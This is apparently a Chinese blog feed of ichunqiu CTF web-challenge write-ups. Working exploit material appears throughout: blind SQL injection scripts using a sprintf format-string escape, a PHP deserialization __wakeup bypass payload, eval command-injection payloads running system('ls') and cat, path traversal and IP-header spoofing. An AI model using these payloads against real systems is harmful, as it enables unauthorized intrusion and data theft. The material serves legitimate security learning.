<p>所以在这里 由于它有/online-movies ，所以我们可以进行浏览目录下载文件，</p>
<p><a href="http://c56bc9b5d3d94306b60d284c36ba4904d5a04f2c66114e60.changame.ichunqiu.com/online-movies../var/www/html/flag.php">http://c56bc9b5d3d94306b60d284c36ba4904d5a04f2c66114e60.changame.ichunqiu.com/online-movies../var/www/html/flag.php</a><br>访问一下URL 就可以下载得到flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag=<span class="string">&#x27;flag&#123;794b0e81-a517-4d4e-acf0-3d9086915a2d&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag_is_here&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="web——hello-world"><a href="#web——hello-world" class="headerlink" title="web——hello world"></a>web——hello world</h2><p>这道题目有点熟悉：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210220102719.png" alt="img"></p>
<p>有个role，解码后是<code>f:5:&quot;thrfg&quot;;</code><br>好像之前做过这题吧，rot13解密以后，改为admin再登录看看，发现考点不是在这里，看源码有个flag.xmas.js可以访问，删除xms后就可以访问了，然后是一堆看不懂的代码</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219233505.png" alt="img" style="zoom:67%;">

<p>然后看了一下wp，说是git源码泄露，因为可以看到js的源码，于是尝试用githack工具抓取</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219233945.png" alt="img" style="zoom:67%;">
看了一下wp，说是应该抓取到两个flag.js，然后进行比对就可以得到flag，但是这题，只有一个？？？直接输入那个flag.js.04bb09也没有发现，大概没了吧？

<h2 id="web——phone-number"><a href="#web——phone-number" class="headerlink" title="web——phone number"></a>web——phone number</h2><p>一开始的登录界面推测是SQL注入<br>所以尝试了一波 没有收获，于是在注册界面入手，因为是phone number题目，所以在手机号的地方应该可能性很大，进行注入试试：<br>当我提交不是数字的时候，提示要为数字，将注入语句转为十六进制试试：<br>有字符限制，只能输入十一位——在审查元素那边更改一下限制试试<br>但是这题不论怎么注册都是dberror？？？看了下评论区也是，难道又炸了？？？？？算了理解思路就好了</p>
<h2 id="web——GetFlag"><a href="#web——GetFlag" class="headerlink" title="web——GetFlag"></a>web——GetFlag</h2><p>登录界面，看着像sql注入，于是尝试1’or 1=1# 密码随意，验证码用之前写过的脚本就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s=<span class="string">&#x27;163e9e&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">    a=i</span><br><span class="line">    i=hashlib.md5(str(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>:<span class="number">6</span>] == str(s):</span><br><span class="line">        print(a)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>即可登录</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210220102726.png" alt="img" style="zoom:67%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a.php:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Do what you want to do, web dog, flag is in the web root dir&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>点开源码：发现有个文件包含漏洞<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210220103125.png" alt="img"></p>
<p>但是没拿到真的，想起来上面的源码说flag 在网站根目录下，于是尝试<br><code>/var/www/html/flag.php、/var/www/html/challenges/flag.php、/var/www/html/challenges/file/flag.php</code>都不行，于是去看了一下wp，说就是第二个路径，但是为啥打不开==，然后后面又说在flag.php页面，于是我直接访问flag.php，，发现根本就没这个页面？？？晕了==后来发现 原来c要大写…..</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_POST[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">$f = str_replace(<span class="keyword">array</span>(<span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>), <span class="string">&#x27;&#x27;</span>, $f);<span class="comment">//过滤了那些字符</span></span><br><span class="line"><span class="keyword">if</span>((strlen($f) &gt; <span class="number">13</span>) || (<span class="literal">false</span> !== stripos($f, <span class="string">&#x27;return&#x27;</span>)))<span class="comment">//flag的长度不能大于13，也不能有return字符</span></span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;wowwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">		 <span class="keyword">eval</span>(<span class="string">&quot;\$spaceone = <span class="subst">$f</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($spaceone === <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//将spaceone的值和flag作比较</span></span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;helloctf.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="eval函数特性"><a href="#eval函数特性" class="headerlink" title="eval函数特性"></a>eval函数特性</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>函数传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 <span class="string">&#x27;echo &quot;Hi!&quot;&#x27;</span> 会导致一个 parse <span class="built_in">error</span>，而 <span class="string">&#x27;echo &quot;Hi!&quot;;&#x27;</span> 则会正常运行。</span><br></pre></td></tr></table></figure>

<p>为什么之前我们写一句话木马的时候没有这样呢？ 因为我们在前面加了个@<br>所以这里需要输入的是flag=flag;<br>然后点击源码，就可以看到flag了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210220125949.png" alt="img" style="zoom:67%;">



<h2 id="web——中国象棋"><a href="#web——中国象棋" class="headerlink" title="web——中国象棋"></a>web——中国象棋</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/common.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/play.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/AI.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/bill.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/[abcmlyx]&#123;2&#125;ctf[0-9]&#123;3&#125;.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/gambit.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;clear:both&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题又是只是盲区了，看了一下wp，说是js的正则表达式，</p>
<p>原来是这样，有一个js文件，文件名由abcmlyx的两个字母+ctf+0-9的三个数字组成，接下来就需要爆破了<br>直接用burp suit抓包 进行爆破<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210220142857.png" alt="img"></p>
<p>然后选择爆破模式:<code>cluster bomb</code>分别对其进行爆破即可，然后没爆破出来<br>发现 是我URL构造错了 应该是/js/xxxx.js！！！！！！！！！！！！！！</p>
<p>然后就可以拿到flag了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210220142934.png" alt="img" style="zoom:67%;"></p>
]]></content>
  </entry>
  <entry>
    <title>i春秋6</title>
    <url>/2021/02/22/i%E6%98%A5%E7%A7%8B6/</url>
    <content><![CDATA[<h2 id="web——not-found"><a href="#web——not-found" class="headerlink" title="web——not found"></a>web——not found</h2><p>抓包看看请求报文，在返回报文中点多了有个X-method，又根据提示说The requested URL..，猜想会不会请求方法，于是开始尝试：<a id="more"></a><br>1   GET  发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外get支持快取、缓存</p>
<p>、可保留书签等。幂等</p>
<p>2   POST  和get一样很常见，向服务器提交资源让服务器处理，比如提交表单、上传文件等，可能导致建立新的资源或者对</p>
<p>原有资源的修改。提交的资源放在请求体中。不支持快取。非幂等</p>
<p>3   HEAD  本质和get一样，但是响应中没有呈现数据，而是http的头信息，主要用来检查资源或超链接的有效性或是否可以可达、检</p>
<p>查网页是否被串改或更新，获取头信息等，特别适用在有限的速度和带宽下。</p>
<p>  4   PUT  和post类似，html表单不支持，发送资源与服务器，并存储在服务器指定位置，要求客户端事先知</p>
<p>道该位置；比如post是在一个集合上（/province），而put是具体某一个资源上（/province/123）。所以put是安全的，</p>
<p>无论请求多少次，都是在123上更改，而post可能请求几次创建了几次资源。幂等</p>
<p>5   DELETE   请求服务器删除某资源。和put都具有破坏性，可能被防火墙拦截。如果是https协议，则无需担心。幂等   </p>
<p>6   CONNECT  HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。就是把服务器作为跳板，去访问其他网页</p>
<p>然后把数据返回回来，连接成功后，就可以正常的get、post了。</p>
<p>7   OPTIONS   获取http服务器支持的http请求方法，允许客户端查看服务器的性能，比如ajax跨域时的预检等。   </p>
<p>8   TRACE  回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击</p>
<p>在使用OPTIONS的时候，出现了locationf ?f=1.php的跳转，尝试访问，访问不了<br>看了一下wp 说可以扫描一下目录 看看有没有其他提示信息<br>扫到了一个.htaccess apache网站的配置文件，于是用这个文件包含漏洞打开试试，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222101644.png" alt="img"></p>
<p>打开这个网页试试：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222101725.png" alt="img" style="zoom:67%;"><br>需要伪造IP，这里说XFF 但是我用XFF伪造IP后 还是这个页面，于是查了一下 还有什么</p>
<h4 id="伪造IP的方法"><a href="#伪造IP的方法" class="headerlink" title="伪造IP的方法:"></a>伪造IP的方法:</h4><p>获取客户端IP，很多代码都会拿 <code>HTTP_CLIENT_IP</code>的值，其次拿 <code>HTTP_X_FORWARDED_FOR</code>，最后是 <code>REMOTE_ADDR</code>。<br>参考：<a href="https://segmentfault.com/q/1010000000686700/a-1020000000687155%E6%89%80%E4%BB%A5">https://segmentfault.com/q/1010000000686700/a-1020000000687155所以</a> 这里我们就可以：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222101948.png" alt="img" style="zoom:67%;">

<h2 id="web——SQLI"><a href="#web——SQLI" class="headerlink" title="web——SQLI"></a>web——SQLI</h2><p>看起来就像是SQL注入的题目，看看过滤了啥吧:</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222104303.png" alt="img"><br>发现出现%会报错，看了一下wp，发现是sprintf格式化字符串逃逸漏洞<br>于是学习一下，感觉和之前的宽字节注入差不多呀？都是吃掉字符，但是又不太一样:</p>
<h3 id="sprintf格式化字符串逃逸漏洞"><a href="#sprintf格式化字符串逃逸漏洞" class="headerlink" title="sprintf格式化字符串逃逸漏洞"></a>sprintf格式化字符串逃逸漏洞</h3><p><strong>在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\也不例外。</strong></p>
<p>使用%1$吃掉后面的斜杠，而不引起报错<br>参考：<a href="https://cloud.tencent.com/developer/article/1669052">https://cloud.tencent.com/developer/article/1669052</a></p>
<p>直接看payload吧:用户名正确和错误返回的内容也不一样，所以直接看脚本吧:<br>写脚本肯定是要先测试语句的，然后发现 后面只能用ascii码 不能像之前一样直接用字符了,由于太懒 所以就没盲注库名的长度:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers=s.get(url).headers</span><br><span class="line">db_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">        payload=<span class="string">f&quot;admin%1$&#x27;and ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> s.post(url,data=data).text:</span><br><span class="line">            print(<span class="string">&quot;11111111&quot;</span>)</span><br><span class="line">            db_name+=chr(j)</span><br><span class="line">            print(db_name)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222134357.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url&#x3D;r&quot;http:&#x2F;&#x2F;9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com&#x2F;&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">headers&#x3D;s.get(url).headers</span><br><span class="line">db_name&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in range(65,126):</span><br><span class="line">        payload&#x3D;f&quot;admin%1$&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167),&#123;i&#125;,1))&#x3D;&#123;j&#125;#&quot;</span><br><span class="line">        data&#x3D;&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;</span><br><span class="line">        # print(s.post(url,data&#x3D;data).text)</span><br><span class="line">        print(payload)</span><br><span class="line">        if &quot;password error!&quot; in s.post(url,data&#x3D;data).text:</span><br><span class="line">            print(&quot;11111111&quot;)</span><br><span class="line">            db_name+&#x3D;chr(j)</span><br><span class="line">            print(db_name)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>刚跑出了表是flag，字段名也是flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers=s.get(url).headers</span><br><span class="line">db_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">126</span>):</span><br><span class="line">        payload=<span class="string">f&quot;admin%1$&#x27;and ascii(substr((select flag from flag),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> s.post(url,data=data).text:</span><br><span class="line">            print(<span class="string">&quot;11111111&quot;</span>)</span><br><span class="line">            db_name+=chr(j)</span><br><span class="line">            print(db_name)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>需要说明的是，这里的范围一开始我是1-33后来发现还剩一半没跑出来 于是就继续叠加上去了<br>flag{b5b36121-86dd-a4db-aab3-86ddb749dfa1}<br>感觉每次做完要写脚本的题目就想去世</p>
<h2 id="web——Hash"><a href="#web——Hash" class="headerlink" title="web——Hash"></a>web——Hash</h2><p>在源码中给到了这样一句话:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--$hash&#x3D;md5($sign.$key);the length of $sign is 8--&gt;</span><br></pre></td></tr></table></figure>

<p>f9109d5f83921a551cf859f853afe7bb   MD5解密后为kkkkkk01123<br>根据这句话说 sign是kkkkkk01 key是123<br>他说you are 123;if you are not 123,you can get the flag<br>所以我们把key改成456 则：kkkkkk01456 MD5加密后为:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222145651.png" alt="img" style="zoom:67%;"><br>打开看看:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;Gu3ss_m3_h2h2.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>得到这段源码:<br>先看看下面的吧: get一个var值 经过解码以后，如果这个var值经过正则匹配，匹配内容为:先匹配一下一个字母o或者c匹配字符:/i是不区分大小写如果匹配到 则die没有的话就反序列化var，如果没收到值就高亮显示那个php文件<br>那上面的那个类有啥用？看了一下wp说是要去看CVE-2016-7124漏洞，然后就能理解了:<br>在<strong>反序列化的过程中，如果使用了Demo类则会优先使用wakeup()函数</strong>，而这个wake_up函数又会使打开的文件变成Gu3ss_m3_h2h2.php，而我们根据提示，知道我们要打开的是f15g_1s_here.php这个文件，在destruct()函数中就会被打开，所以在这里 我们需要传入一个值，并且调用了class，使得这个值的file为f15g_1s_here.php，绕过这个wakeup()函数和正则表达式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file=<span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;f15g_1s_here.php&#x27;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b=str_ireplace(<span class="string">&quot;O:4&quot;</span>,<span class="string">&quot;O:+4&quot;</span>,$b);<span class="comment">//有的时候绕过不需要这个步骤</span></span><br><span class="line">$b=str_ireplace(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,$b);</span><br><span class="line">$b=base64_encode($b);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到输出的结果为TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==<br><strong>PS：</strong><br>1.一开始我是直接在burpsuit进行base64加密的，怎么都出不来页面，于是看了一下wp发现要在PHP中完成所有操作，包括绕过wakeup()函数的操作，绕过正则的操作，并且进行base64加密，如果在burpsuit里面加密结果是不一样的<br>2.根据之前所说的我们需要新建一个类，并调用里面的public function，使得我们输入的文件名变成$file，然后再被destruct()中的方法使用</p>
<p>访问新的页面得到以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;val&#x27;</span>])) &#123;</span><br><span class="line">    $val = $_GET[<span class="string">&#x27;val&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$value=&quot;&#x27;</span> . addslashes($val) . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hahaha!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>addslashes过滤了单引号、双引号、反斜杠、null<br>这里是让我们传入一个val，会使用eval执行——</p>
<h5 id="eval命令执行漏洞"><a href="#eval命令执行漏洞" class="headerlink" title="eval命令执行漏洞"></a>eval命令执行漏洞</h5><p>这里学了一种很巧妙的构造语句的方式：<br>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?val=$&#123;<span class="keyword">eval</span>($_GET[a])&#125;&amp;a=system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">//让变量$value等于新变量也去执行一个eval来get一个a参数的值，而我们再以get的方式将a参数传入执行</span></span><br></pre></td></tr></table></figure>

<p>接下来可以看到True_F1ag_i3_Here_233.php这样一个文件夹，然后打开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?val=$&#123;<span class="keyword">eval</span>($_GET[a])&#125;&amp;a=system(<span class="string">&#x27;cat+True_F1ag_i3_Here_233.php&#x27;</span>);</span><br><span class="line"><span class="comment">//这里有个地方1.因为空格被过滤了，所以要用+号来代替空号（这里卡了好久）</span></span><br><span class="line"><span class="comment">//2.明明引号也被过滤了，为啥引号还在？我还以为我记错了代码了，把引号去掉，发现是执行不了的？</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210222202941.png" alt="img" style="zoom:67%;">

<p>感觉这题有好多东西，要好好积累一下，并且要记得去整理一下反序列化和序列化的漏洞以及知识！</p>
]]></content>
  </entry>
  <entry>
    <title>i春秋7</title>
    <url>/2021/02/23/i%E6%98%A5%E7%A7%8B7/</url>
    <content><![CDATA[<h2 id="web——fuzzing"><a href="#web——fuzzing" class="headerlink" title="web——fuzzing"></a>web——fuzzing</h2><p>打开页面 啥也没有，抓包看看有没有解题信息 <a id="more"></a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223123348.png" alt="img"></p>
<p>发现写了一个超大内网，百度了一下，内网范围为10.0.0.0——10.255.255.255<br>使用XFF修改了一下IP，访问得到<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223102457.png" alt="img" style="zoom:67%;"><br>以上地址，他说show your key，我们就发送key，一开始是get方式发送的，发现不行，后来就改成了post就可以了。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223103410.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key is not right,md5(key)&#x3D;&#x3D;&#x3D;&quot;1b4167610ba3f2ac426a68488dbd89be&quot;,and the key is ichunqiu***,the * is in [a-z0-9]</span><br></pre></td></tr></table></figure>

<p>出现这句话，接下来就用脚本跑一下后面三位是a-z0-9，但这里可以直接把后面那串拿去MD5解密一下，得到ichunqiu105 用脚本跑的话如下:</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223123257.png" alt="img" style="zoom:67%;">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onimport requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://fe26ac8277bb435fbb5f8355355425a9e6dfa59cc4064743.changame.ichunqiu.com/Challenges/./m4nage.php&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&#x27;10.0.0.0&#x27;</span>&#125;</span><br><span class="line">key=<span class="string">&#x27;ichunqiu&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> payload:</span><br><span class="line">            data=&#123;<span class="string">&quot;key&quot;</span>:key+i+j+h&#125;</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;key is not right&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s.post(url,data=data,headers=headers).text:</span><br><span class="line">                print(key+i+j+h)</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223123547.png" alt="img"></p>
<p>打开看看<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223123709.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authcode</span>(<span class="params">$string, $operation = <span class="string">&#x27;DECODE&#x27;</span>, $key = <span class="string">&#x27;&#x27;</span>, $expiry = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">	$ckey_length = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">	$key = md5($key ? $key : UC_KEY);</span><br><span class="line">	$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">	$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == <span class="string">&#x27;DECODE&#x27;</span> ? substr($string, <span class="number">0</span>, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string = $operation == <span class="string">&#x27;DECODE&#x27;</span> ? base64_decode(substr($string, $ckey_length)) : sprintf(<span class="string">&#x27;%010d&#x27;</span>, $expiry ? $expiry + time() : <span class="number">0</span>) . 